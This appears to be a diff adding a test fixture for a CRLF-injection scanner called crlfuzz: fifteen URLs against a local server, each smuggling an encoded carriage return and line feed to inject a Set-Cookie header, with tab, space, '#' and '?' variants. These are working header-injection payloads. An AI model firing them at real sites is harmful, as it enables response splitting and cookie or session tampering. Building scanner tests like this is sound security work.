@@ -1,0 +1,15 @@
+http://127.0.0.1:33891/go?url=x/%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/%0d%0a%09Set-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/%0d%0a%20Set-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/%23%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/%3f%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/crlfuzz%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/crlfuzz%0d%0a%09Set-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/crlfuzz%0d%0a%20Set-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/crlfuzz%23%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/crlfuzz%3f%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/?crlfuzz=%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/?crlfuzz=%0d%0a%09Set-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/?crlfuzz=%0d%0a%20Set-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/?crlfuzz=%23%0d%0aSet-Cookie:param=crlfuzz;
+http://127.0.0.1:33891/go?url=x/?crlfuzz=%3f%0d%0aSet-Cookie:param=crlfuzz;
